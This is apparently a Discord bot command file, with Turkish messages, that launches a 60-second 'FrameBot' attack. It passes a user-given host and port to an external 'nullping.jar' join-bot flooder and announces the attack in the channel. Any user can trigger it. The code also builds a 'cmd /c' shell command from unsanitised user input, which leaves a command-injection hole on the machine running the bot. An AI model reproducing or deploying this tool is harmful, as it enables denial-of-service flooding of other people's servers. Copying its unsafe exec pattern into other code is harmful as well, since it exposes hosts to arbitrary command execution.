const Discord = require("discord.js");
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
var exec = require('child_process').exec
exec(`cmd /c java -jar nullping.jar host-${host} port-${port} file-tr.txt mode-joinbot time-60`, (error, stdout, stderr) => {
});
console.log('Bir Saldırı Başlatıldı Discord ID:' +  message.guild.id)
message.channel.send(`**FrameBot** Saldırısı başlatıldı. **${host}** adresine, **${port}** portlu, sunucuya **60 Saniye** boyunca saldırılacak.`)
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['framebot-TR'],
  permLevel: 0
}

exports.help = {
  name: 'framebot-tr',
  description: 'Özel',
  usage: 'framebottr'
}